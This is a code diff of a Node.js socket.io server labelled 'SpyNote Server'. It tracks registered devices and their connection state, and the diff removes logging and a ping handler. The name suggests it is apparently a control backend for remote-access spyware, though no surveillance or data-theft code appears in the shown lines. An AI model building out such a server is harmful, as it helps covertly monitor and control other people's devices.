@@ -34,8 +34,6 @@ app.get('/devices', (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    console.log('🔗 Client connected:', socket.id);
-
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
         if (deviceId) {
@@ -46,7 +44,7 @@ io.on('connection', (socket) => {
             });
             socket.join(deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
-            console.log('📱 Device registered:', deviceId);
+            console.log(`📱 Device registered: ${deviceId}`);
         }
     });
 
@@ -81,16 +79,11 @@ io.on('connection', (socket) => {
         }
     });
 
-    socket.on('ping', () => {
-        socket.emit('pong', Date.now() - socket.handshake.time);
-    });
-
     socket.on('disconnect', () => {
         for (const [deviceId, info] of devices.entries()) {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📴 Device disconnected:', deviceId);
                 break;
             }
         }
@@ -98,5 +91,5 @@ io.on('connection', (socket) => {
 });
 
 server.listen(process.env.PORT || 3000, () => {
-    console.log('🚀 SpyNote Server running on port', process.env.PORT || 3000);
+    console.log('🚀 SpyNote Server running on port 3000!');
 });
